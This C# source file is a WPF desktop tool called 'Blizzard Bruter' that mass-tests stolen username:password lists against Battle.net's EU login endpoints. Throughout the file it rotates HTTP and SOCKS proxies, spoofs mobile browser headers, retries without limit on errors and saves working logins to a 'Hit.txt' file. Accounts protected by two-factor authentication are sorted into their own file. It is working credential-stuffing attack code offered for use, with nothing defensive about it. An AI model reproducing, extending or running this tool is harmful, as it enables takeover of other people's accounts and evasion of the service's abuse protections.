using Leaf.xNet;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using ThreadGun;
using Form = System.Windows.Forms;

namespace Blizzard_Bruter1
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        List<string> Combo = new List<string>();
        List<string> Proxy = new List<string>();
        int Bad = 0;
        int Good = 0;
        int Error = 0;
        int Remaining = 0;
        int Checked = 0;
        int Tfa = 0;
        string ResultTime;

        public enum Type
        {
            Http,
            Socks4,
            Socks5
        }
        public Type TypeProxy = Type.Http;

        Form.NotifyIcon ico = new Form.NotifyIcon();

        public MainWindow()
        {
            InitializeComponent();
            ico.Click += Ico_Click;
        }

        private void Ico_Click(object sender, EventArgs e)
        {
            this.Topmost = true;
            this.Topmost = false;
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            new Window1().ShowDialog();
            if (Properties.Settings.Default.Icon == true)
            {
                ico.Visible = true;
                this.ShowInTaskbar = false;
                ico.Icon = new System.Drawing.Icon("C:/Users/mahdi/source/repos/Blizzard Bruter1/Blizzard Bruter1/Image/icon.ico");
                ico.Text = "Blizzard Bruter";
                Form.ContextMenu icomen = new Form.ContextMenu();
                icomen.MenuItems.Add("Open", new EventHandler(Open));
                icomen.MenuItems.Add("Restart", new EventHandler(Restart));
                icomen.MenuItems.Add("About", new EventHandler(About));
                icomen.MenuItems.Add("-");
                icomen.MenuItems.Add("Exit", new EventHandler(Exit));
                ico.ContextMenu = icomen;
            }
        }

        private void About(object sender, EventArgs e)
        {
            Process.Start("https://t.me/Ariaei_co");
        }

        private void Restart(object sender, EventArgs e)
        {
            ico.Dispose();
            Application.Current.Shutdown();
            Process.Start(Environment.GetCommandLineArgs()[0]);
        }

        private void Exit(object sender, EventArgs e)
        {
            ico.Dispose();
            Process.GetCurrentProcess().Kill();
        }

        private void Open(object sender, EventArgs e)
        {
            this.WindowState = WindowState.Normal;
        }

        private void Grid_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (panelMenu.Visibility == Visibility.Visible)
            {
                panelMenu.Visibility = Visibility.Hidden;
            }
            else if (panelMenu.Visibility == Visibility.Hidden)
            {
                panelMenu.Visibility = Visibility.Visible;
            }
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            ico.Dispose();
            Process.GetCurrentProcess().Kill();
        }

        private void btnStart_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (Combo.Count != 0)
                {
                    if (Proxy.Count != 0)
                    {
                        if (Checked == 0 && Error == 0)
                        {
                            if(Properties.Settings.Default.Thread > Combo.Count)
                            {
                                Properties.Settings.Default.Thread = Combo.Count;
                                Properties.Settings.Default.Save();
                            }
                            if (Properties.Settings.Default.proxytype == 1)
                            {
                                TypeProxy = Type.Http;
                            }
                            else if (Properties.Settings.Default.proxytype == 2)
                            {
                                TypeProxy = Type.Socks4;
                            }
                            else if (Properties.Settings.Default.proxytype == 3)
                            {
                                TypeProxy = Type.Socks5;
                            }
                            ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                            Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                            new ThreadGun<string>(Config, Combo, Properties.Settings.Default.Thread, Thr_Completed, null).FillingMagazine().Start();
                        }
                    }
                    else
                    {
                        MessageBox.Show("Please Load IP.", "Start");
                    }
                }
                else
                {
                    MessageBox.Show("Please Load Base.", "Start");
                }
            }
            catch
            {
                Directory.Delete("Checked in " + $"{ResultTime}");
                MessageBox.Show("Error To Start Checking.", "Start");
            }
        }

        private void btnBase_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Base |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Base ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Combo.Clear();
                    StreamReader sr = new StreamReader(Open.FileName);
                    while (!sr.EndOfStream)
                    {
                        try
                        {
                            string txt = sr.ReadLine();
                            char[] Spl = { ':' };
                            string[] Comb = txt.Split(Spl);
                            string Com = Comb[1];
                            for (int i = 2; i < Comb.Length; i++)
                            {
                                Com += ":" + Comb[i];
                            }
                            Combo.Add(Comb[0] + ":" + Com);
                        }
                        catch
                        {

                        }
                    }
                    sr.Close();
                    btnBase.Content = Combo.Count.ToString();
                }
            }
            catch
            {

            }
        }

        private void btnIP_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select IP |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select IP ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Proxy.Clear();
                    StreamReader sr = new StreamReader(Open.FileName);
                    while (!sr.EndOfStream)
                    {
                        try
                        {
                            string txt = sr.ReadLine();
                            char[] Spl = { ':' };
                            string[] Prox = txt.Split(Spl);
                            Proxy.Add(Prox[0] + ':' + Prox[1]);
                        }
                        catch
                        {

                        }
                    }
                    sr.Close();
                    btnIP.Content = Proxy.Count.ToString();
                }
            }
            catch
            {

            }
        }

        private void textboxAPI_TextChanged(object sender, TextChangedEventArgs e)
        {
            try
            {
                HttpRequest http = new HttpRequest();
                var result = http.Get(textboxAPI.Text).ToString();
                var Final = result.Split('\n');
                Proxy.Clear();
                Proxy.AddRange(Final);
                btnIP.Content = Proxy.Count.ToString();
            }
            catch
            {

            }
        }

        private void checkboxAPI_Checked(object sender, RoutedEventArgs e)
        {
            textboxAPI.IsEnabled = true;
            btnIP.IsEnabled = false;
            textboxAPI.Clear();
        }

        private void checkboxAPI_Unchecked(object sender, RoutedEventArgs e)
        {
            textboxAPI.IsEnabled = false;
            btnIP.IsEnabled = true;
            textboxAPI.Text = "API:";
        }

        private void btnSetting_Click(object sender, RoutedEventArgs e)
        {
            new Blizzard_Bruter1.Window2().ShowDialog();
        }

        private void btnRestart_Click(object sender, RoutedEventArgs e)
        {
            ico.Dispose();
            Application.Current.Shutdown();
            Process.Start(Environment.GetCommandLineArgs()[0]);
        }

        private void btnMinimize_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void btnAbout_Click(object sender, RoutedEventArgs e)
        {
            Process.Start("https://t.me/Ariaei_co");
        }

        private void Thr_Completed(IEnumerable<string> inputs)
        {
            MessageBox.Show("Blizzard Checking Was Completed.");
        }

        private void Config(string line)
        {
            string User = line.Split(':')[0];
            string Pass = line.Split(':')[1];
            for (int i = 2; i < line.Split(':').Length; i++)
            {
                Pass += ":" + line.Split(':')[i];
            }
            First:
            try
            {
                int p = new Random().Next(Proxy.Count);
                CookieStorage cook = new CookieStorage();
                HttpRequest Get = new HttpRequest();
                switch (TypeProxy)
                {
                    case Type.Http:
                        Get.Proxy = HttpProxyClient.Parse(Proxy[p]);
                        break;
                    case Type.Socks4:
                        Get.Proxy = Socks4ProxyClient.Parse(Proxy[p]);
                        break;
                    case Type.Socks5:
                        Get.Proxy = Socks5ProxyClient.Parse(Proxy[p]);
                        break;
                }
                Get.UserAgent = "Mozilla/5.0 (Linux; Android 8; GOOGLE PIXEL 2 Build/GP2.10417; GP) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3890.150 Mobile Safari/537.36";
                Get.AddHeader(HttpHeader.Accept, "application/json");
                Get.AddHeader(HttpHeader.Origin, "https://eu.battle.net");
                Get.AddHeader(HttpHeader.AcceptLanguage, "fr-fr");
                Get.Referer = "https://eu.battle.net/login/en/?app=bsap";
                Get.AddHeader("X-Requested-With", "XMLHttpRequest");
                Get.IgnoreProtocolErrors = true;
                Get.UseCookies = true;
                Get.AllowAutoRedirect = true;
                Get.Cookies = cook;
                Get.KeepAlive = true;
                string response = Get.Post("https://eu.battle.net/login/srp?csrfToken=true", Encoding.ASCII.GetBytes("{\"inputs\":[{\"input_id\":\"account_name\",\"value\":\"" + User + "\"}]}"), "application/json").ToString();
                if (response.Contains("{\"modulus\":"))
                {
                    string Token = Regex.Match(response, "\"csrf_token\": \"(.*?)\",").Groups[1].Value.ToString();
                    string Pub = Regex.Match(response, "\"public_B\": \"(.*?)\",").Groups[1].Value.ToString();
                    string Time = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
                    //============================================//
                    HttpRequest Login = new HttpRequest();
                    switch (TypeProxy)
                    {
                        case Type.Http:
                            Login.Proxy = HttpProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.Socks4:
                            Login.Proxy = Socks4ProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.Socks5:
                            Login.Proxy = Socks5ProxyClient.Parse(Proxy[p]);
                            break;
                    }
                    Login.UserAgent = "Mozilla/5.0 (Linux; Android 8; GOOGLE PIXEL 2 Build/GP2.10417; GP) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3890.150 Mobile Safari/537.36";
                    Login.AddHeader(HttpHeader.CacheControl, "max-age=0");
                    Login.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                    Login.Referer = "https://eu.battle.net/login/en/?app=bsap";
                    Login.AddHeader(HttpHeader.AcceptLanguage, "fr-FR");
                    Login.AddHeader(HttpHeader.Origin, "https://eu.battle.net");
                    Login.AddHeader("Upgrade-Insecure-Requests", "1");
                    Login.AddHeader("X-Requested-With", "com.blizzard.messenger");
                    Login.IgnoreProtocolErrors = true;
                    Login.UseCookies = true;
                    Login.Cookies = cook;
                    Login.KeepAlive = true;
                    Login.AllowAutoRedirect = false;
                    var Data = Login.Post("https://eu.battle.net/login/en/?app=bsap", Encoding.ASCII.GetBytes("accountName=" + User + "&password=" + Pass + "&useSrp=false&publicA=" + Pub + "&persistLogin=on&csrftoken=" + Token + "&sessionTimeout=" + Time + ""), "application/x-www-form-urlencoded");
                    string Data1 = Data[HttpHeader.Location];
                    if (Data1.Contains("http://localhost:0/?"))
                    {
                        Good++;
                        Checked++;
                        lblGood.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblGood.Content = Good.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = Checked.ToString(); }));
                        Remaining = Combo.Count - Checked;
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Hit.txt", true);
                        sw.WriteLine("===========================Details===========================\nUsername:" + User + "\nPassword:" + Pass + "\n===========================End===========================\n\n");
                        sw.Close();
                    }
                    else if (Data.ToString().Contains("STATE_LOGIN"))
                    {
                        Bad++;
                        Checked++;
                        lblBad.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblBad.Content = Bad.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = Checked.ToString(); }));
                        Remaining = Combo.Count - Checked;
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Fail.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                    }
                    else if (Data1.Contains("https://eu.battle.net/login/en/authenticator"))
                    {
                        Tfa++;
                        Checked++;
                        lbl2FA.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lbl2FA.Content = Tfa.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = Checked.ToString(); }));
                        Remaining = Combo.Count - Checked;
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = Remaining.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\2FA.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                    }
                    else
                    {
                        Error++;
                        lblError.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblError.Content = Error.ToString(); }));
                        Thread.Sleep(2000);
                        goto First;
                    }
                    Login.Dispose();
                }
                else
                {
                    Error++;
                    lblError.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblError.Content = Error.ToString(); }));
                    Thread.Sleep(2000);
                    goto First;
                }
                Get.Dispose();
            }
            catch
            {
                Error++;
                lblError.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblError.Content = Error.ToString(); }));
                Thread.Sleep(2000);
                goto First;
            }
        }
    }
}
